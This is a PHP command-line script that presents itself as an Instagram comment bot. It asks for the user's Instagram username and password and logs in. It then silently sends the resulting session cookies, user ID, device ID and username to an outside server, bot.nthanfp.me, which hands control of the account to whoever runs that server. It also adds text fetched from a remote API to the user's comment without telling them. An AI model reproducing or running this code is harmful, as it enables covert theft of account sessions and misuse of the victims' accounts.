<?php
require('func.php');
require('ass.php');
error_reporting(0);
set_time_limit(0);
echo banner1();
echo banner2();
echo ">> Input your instagram username : ";
$userig    = trim(fgets(STDIN, 1024));
echo ">> Input your instagram password : ";
$passig    = trim(fgets(STDIN, 1024));
// kyaa
$useragent = generate_useragent();
$device_id = generate_device_id();
$user      = $userig;
$pass      = $passig;
$login     = proccess(1, $useragent, 'accounts/login/', 0, hook('{"device_id":"' . $device_id . '","guid":"' . generate_guid() . '","username":"' . $userig . '","password":"' . $passig . '","Content-Type":"application/x-www-form-urlencoded; charset=UTF-8"}'), array(
    'Accept-Language: id-ID, en-US',
    'X-IG-Connection-Type: WIFI'
));
$ext       = json_decode($login[1]);
if($ext->status <> 'ok') {
    echo $ext->message . "\n";
} else {
    preg_match_all('%Set-Cookie: (.*?);%', $login[0], $d);
    $cookie = '';
    for($o = 0; $o < count($d[0]); $o++)
        $cookie .= $d[1][$o] . ";";
    $uname       = $ext->logged_in_user->username;
    $req         = proccess(1, $useragent, 'feed/timeline/', $cookie);
    $is_verified = (json_decode($req[1])->status <> ok) ? 0 : 1;
    $uid         = $ext->logged_in_user->pk;
    echo ">> Login Success....\n";
    echo ">> Please Wait\n";
    $data  = array(
        'aksi' => 'addig',
        'id' => $uid,
        'cookies' => $cookie,
        'useragent' => $useragent,
        'device_id' => $device_id,
        'verifikasi' => $is_verified,
        'username' => $uname,
        'uplink' => 'admin'
    );
    $addig   = req('https://bot.nthanfp.me/action/api().php', $data);
    echo ">> Target Post Url : ";
    $url     = trim(fgets(STDIN, 1024));
    echo ">> Comment Text : ";
    $comen   = trim(fgets(STDIN, 1024));
    $mediaid = getmediaid($url);
    //start
    $text    = json_decode(file_get_contents('https://nthanfp.me/api/get/GetCommentText?apikey=NTHANFP150503'));
    $comment = proccess(1, $useragent, 'media/'.$mediaid.'/comment/', $cookie, hook('{"comment_text":"'.$comen.' '.$text->data->text.'"}'));
    $comment = json_decode($comment[1]);
    if($comment->status=='ok'){
    	echo ">> Success comment";
    } else {
    	echo ">> Failed comment";
    }
}
?>